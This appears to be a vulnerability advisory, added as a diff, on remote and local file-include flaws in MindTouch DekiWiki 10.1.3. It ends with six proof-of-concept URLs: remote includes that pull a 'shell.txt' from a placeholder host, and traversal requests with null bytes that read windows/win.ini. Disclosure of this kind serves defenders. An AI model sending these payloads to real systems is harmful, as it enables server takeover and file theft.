@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/54991/info
+
+MindTouch DekiWiki is prone to multiple remote and local file-include vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary server-side script code that resides on an affected computer or in a remote location with the privileges of the web server process. This may facilitate unauthorized access.
+
+MindTouch DekiWiki 10.1.3 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/deki/web/deki/gui/link.php?IP=http://www.example.com/shell.txt?
+http://www.example.com/deki/web/deki/plugins/deki_plugin.php?IP=http://www.example.com/shell.txt?
+http://www.example.com/deki/web/deki/plugins/deki_plugin.php?wgDekiPluginPath=http://www.example.com/shell.txt?
+http://www.example.com/deki/web/deki/gui/link.php?IP=../../../../../../../../../windows/win.ini%00
+http://www.example.com/deki/web/deki/plugins/deki_plugin.php?IP=../../../../../../../../../windows/win.ini%00
+http://www.example.com/deki/web/deki/plugins/deki_plugin.php?wgDekiPluginPath=../../../../../../../../../windows/win.ini%00 
